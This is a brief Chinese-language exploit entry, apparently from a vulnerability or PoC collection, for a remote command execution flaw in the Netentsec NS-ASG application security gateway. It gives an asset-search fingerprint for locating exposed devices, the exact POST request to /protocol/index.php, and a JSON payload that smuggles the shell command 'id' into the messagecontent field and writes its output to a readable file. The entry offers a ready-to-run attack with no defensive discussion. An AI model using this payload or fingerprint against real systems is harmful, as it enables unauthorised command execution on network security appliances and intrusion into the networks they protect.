# 网康NS-ASG应用安全网关存在远程命令执行漏洞

- **系统**：网康NS-ASG应用安全网关　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title=="网康 NS-ASG 应用安全网关"`
- **请求**：`POST /protocol/index.php HTTP/1.1`

**请求体 / payload**
```
1. 执行如下执行POC语句，同时执行id命令并写入/protocol/1.txt。
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
jsoncontent={"protocolType":"getsysdatetime","messagecontent":"1;id>1.txt;"}
2. 访问`/protocol/1.txt`路径，获取命令执行结果。
/protocol/1.txt
```

**其他**
- 网康 NS-ASG应用安全网关存在远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 网康应用安全网关系统